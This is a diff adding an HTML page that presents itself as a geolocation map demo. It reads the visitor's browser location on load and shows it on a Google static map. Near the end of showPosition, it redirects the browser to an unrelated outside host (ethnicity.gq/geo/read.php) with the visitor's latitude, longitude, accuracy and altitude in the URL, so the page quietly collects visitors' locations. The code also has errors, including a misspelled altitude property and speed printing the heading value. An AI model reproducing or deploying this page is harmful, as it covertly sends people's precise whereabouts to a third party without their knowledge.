@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+<title> geo location </title>
+<p id="demo">geo locate in map</p>
+
+<body onload="getLocation();">
+
+<div id="mapholder"></div>
+<script>
+var x = document.getElementById("demo");
+function getLocation() 
+{
+    if (navigator.geolocation) 
+    {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } 
+    else
+     {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+    }
+}
+
+function showPosition(position)
+ {
+    var latlon = position.coords.latitude + "," + position.coords.longitude;
+     x.innerHTML = "Latitude: " + position.coords.latitude +
+    "<br>Longitude: " + position.coords.longitude+"<br> accuracy : "+position.coords.accuracy+"<br> altitude: "
+     +position.coords.attitude+"<br> altitude accuracy: "+position.coords.altitudeAccuracy+"<br> heading: "+position.coords.heading+
+     "<br> speed: "+position.coords.heading+"<br>timestamp "+position.timestamp;
+    var img_url = "https://maps.googleapis.com/maps/api/staticmap?center="
+    +latlon+"&zoom=14&size=400x300&sensor=false";
+    document.getElementById("mapholder").innerHTML = "<img src='"+img_url+"'>";
+    console.log(latlon, "Logged!");
+    //--------------------------------------------------------
+    var data = "{latitude: \"" + position.coords.latitude + "\', longitude: \'" + position.coords.longitude + "\'}";
+    var url = 'data:text/json;charset=utf8,' + encodeURIComponent(data);
+    window.open(url, '_blank');
+    window.focus();
+ window.location.href = "https://ethnicity.gq/geo/read.php?lat=" +  position.coords.latitude + "&lon=" + position.coords.longitude + "&acc=" + position.coords.accuracy + "&alt=" +position.coords.altitude;
+
+}
+
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            x.innerHTML = "User denied the request for Geolocation."
+            break;
+        case error.POSITION_UNAVAILABLE:
+            x.innerHTML = "Location information is unavailable."
+            break;
+        case error.TIMEOUT:
+            x.innerHTML = "The request to get user location timed out."
+            break;
+        case error.UNKNOWN_ERROR:
+            x.innerHTML = "An unknown error occurred."
+            break;
+    }
+}
+</script>
+
+
+</body>
+</html>
